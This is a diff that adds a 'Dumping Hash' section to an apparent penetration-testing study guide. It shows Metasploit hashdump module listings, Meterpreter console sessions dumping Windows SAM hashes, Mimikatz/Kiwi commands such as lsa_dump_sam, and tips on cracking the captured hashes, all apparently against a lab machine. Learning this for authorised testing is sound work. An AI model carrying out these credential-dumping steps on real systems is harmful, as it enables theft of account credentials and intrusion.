@@ -554,6 +554,140 @@ Before you can use the local exploit suggester, you must already have a session 
 
 Reference: https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
 
+### **Dumping Hash**
+
+- There are multiple ways to capture hash values within Meterpreter
+
+- post hasdump module 
+
+```
+
+search hashdump
+
+Matching Modules
+================
+
+   #   Name                                                  Disclosure Date  Rank    Check  Description
+   -   ----                                                  ---------------  ----    -----  -----------
+   0   post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
+   1   post/android/gather/hashdump                                           normal  No     Android Gather Dump Password Hashes for Android Systems
+   2   post/bsd/gather/hashdump                                               normal  No     BSD Dump Password Hashes
+   3   auxiliary/scanner/smb/impacket/secretsdump                             normal  No     DCOM Exec
+   4   auxiliary/gather/ldap_hashdump                        2020-07-23       normal  No     LDAP Information Disclosure
+   5   post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
+   6   auxiliary/scanner/mssql/mssql_hashdump                                 normal  No     MSSQL Password Hashdump
+   7   auxiliary/scanner/mysql/mysql_hashdump                                 normal  No     MYSQL Password Hashdump
+   8   post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
+   9   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
+   10  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
+   11  auxiliary/scanner/oracle/oracle_hashdump                               normal  No     Oracle Password Hashdump
+   12  auxiliary/analyze/crack_databases                                      normal  No     Password Cracker: Databases
+   13  auxiliary/scanner/postgres/postgres_hashdump                           normal  No     Postgres Password Hashdump
+   14  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
+   15  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
+   16  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
+   17  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
+   18  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes
+
+
+Interact with a module by name or index. For example info 18, use 18 or use post/windows/gather/smart_hashdump
+
+msf6 exploit(windows/local/bypassuac_eventvwr) > use 17
+msf6 post(windows/gather/hashdump) > 
+
+```
+
+msf6 post(windows/gather/hashdump) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                    Connection
+  --  ----  ----                     -----------                    ----------
+  8         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC         10.13.6.58:4444 -> 10.10.190.82:49214 (10.10.190.82)
+  9         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DARK-PC  10.13.6.58:9999 -> 10.10.190.82:49229 (10.10.190.82)
+
+msf6 post(windows/gather/hashdump) > set session 9
+session => 9
+msf6 post(windows/gather/hashdump) > options 
+
+Module options (post/windows/gather/hashdump):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  9                yes       The session to run this module on
+   
+msf6 post(windows/gather/hashdump) > run
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY e8764ef63a8864b8326f31fae6b3ad34...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+Dark:"Please don't use this password ever"
+
+[*] Dumping password hashes...
+
+```
+- Or
+
+- Mimikatz / Kiwi
+
+```
+
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+    
+meterpreter > lsa_dump_sam 
+[+] Running as SYSTEM
+[*] Dumping SAM
+Domain : DARK-PC
+SysKey : e8764ef63a8864b8326f31fae6b3ad34
+Local SID : S-1-5-21-2096091615-1365079743-3039020981
+
+SAMKey : e4050cd05f9f5141fa36ed6c2e84c44a
+
+.......
+
+```
+
+- Once hash has been identified, you can utilize any online hash decoder such as https://crackstation.net/, etc or off-line tools such as John the Ripper or Hash Cat
 
 ### **Let's Practice**
 
